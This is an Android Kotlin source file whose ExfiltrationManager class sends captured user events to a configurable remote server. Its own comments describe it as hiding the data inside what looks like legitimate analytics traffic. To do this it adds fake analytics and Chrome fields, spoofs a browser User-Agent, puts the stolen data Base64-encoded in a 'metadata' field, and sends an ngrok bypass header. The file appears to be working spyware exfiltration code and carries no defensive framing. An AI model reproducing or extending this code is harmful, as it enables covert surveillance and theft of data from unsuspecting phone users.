package com.android.myapp.exfiltration

import android.util.Base64
import com.google.gson.Gson
import com.android.myapp.data.CapturedEvent
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import timber.log.Timber
import java.util.*
import java.util.concurrent.TimeUnit
import android.content.Context
import com.android.myapp.BuildConfig
import java.io.IOException
import java.io.ByteArrayOutputStream
import java.util.zip.GZIPOutputStream
import androidx.core.content.edit

/**
 * Manages exfiltration strategy
 */
class ExfiltrationManager(private val context: Context) {

    private val httpClient = OkHttpClient
                             .Builder()
                             .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                             .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                             .pingInterval(25, TimeUnit.SECONDS)      // Keep-alive pings
                             .retryOnConnectionFailure(true)
                             .build()

    private val gson = Gson()

    // the server key must match to the api key on android app
    private val apiKey = BuildConfig.MY_API_KEY // YOUR-API-KEY
    private val serverUrl = BuildConfig.SERVER_URL // YOUR-SERVER-URL

    /**
     * Strategy: HTTP Piggybacking
     * Hides data in what looks like legitimate analytics traffic
     */
    suspend fun exfiltrateViaHTTP(events: MutableList<List<CapturedEvent>>): Boolean {
        return try {
            // Compress and encode data
            val payload = preparePayload(events.toList().flatten())

            // Create request that looks like analytics
            val requestBody = JSONObject().apply {
                put("event_type", "user_interaction")
                put("timestamp", System.currentTimeMillis())
                put("session_id", UUID.randomUUID().toString())
                put("analytics google status", "Healthy")
                put("chrome_app_version", "1.0.0")
                put("device_id", getDeviceId())
                // Hide actual data in metadata field
                put("metadata", Base64.encodeToString(payload, Base64.NO_WRAP))
            }.toString()

            val request =
                 Request.Builder()
                .url("$serverUrl/api/collect")
                .addHeader("User-Agent", getSystemUserAgent())
                .addHeader("Content-Type", "application/json")
                .addHeader("x-api-key", apiKey)
                .addHeader("ngrok-skip-browser-warning", "true")
                .post(requestBody.toRequestBody("application/json".toMediaType()))
                .build()

            val response = httpClient.newCall(request).execute()
            val success = response.isSuccessful

            response.close()

            if (success) {
                Timber.d("HTTP exfiltration successful")
            } else {
                Timber.w("HTTP exfiltration failed: ${response.code}")
            }

            success
        } catch (e: IOException) {
            Timber.e(e, "HTTP exfiltration error")
            false
        }
    }

    /**
     * Prepare payload for exfiltration
     */
    private fun preparePayload(events: List<CapturedEvent>): ByteArray {
        // Convert events to JSON
        val json = gson.toJson(events)

        // Compress (optional)
        // val raw = json.toByteArray(UTF_8)
        // val compressed = gzip(raw)
        // return compressed

        return json.toByteArray()
    }

    /** GZIP-compress a byte array. */
    private fun gzip(input: ByteArray): ByteArray {
        if (input.isEmpty()) return input

        val bos = ByteArrayOutputStream()
        GZIPOutputStream(bos).use { gzipOut ->
            gzipOut.write(input)
            // use{} will close/finish the stream which flushes all gzip bytes
        }
        return bos.toByteArray()
    }

    /**
     * Prepare DeviceId for exfiltration
     */
    private fun getDeviceId(): String {
        // Generate consistent device ID
        val sharedPrefs = context.getSharedPreferences("exfil_prefs", Context.MODE_PRIVATE)
        var deviceId = sharedPrefs.getString("device_id", null)

        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString()
            sharedPrefs.edit { putString("device_id", deviceId) }
        }

        return deviceId
    }

    /**
     * Prepare The System User Agent for exfiltration
     */
    private fun getSystemUserAgent(): String {
        val androidVersion = android.os.Build.VERSION.RELEASE
        val deviceModel = android.os.Build.MODEL
        return "Mozilla/5.0 (Linux; Android $androidVersion; $deviceModel) AppleWebKit/537.36"
    }
}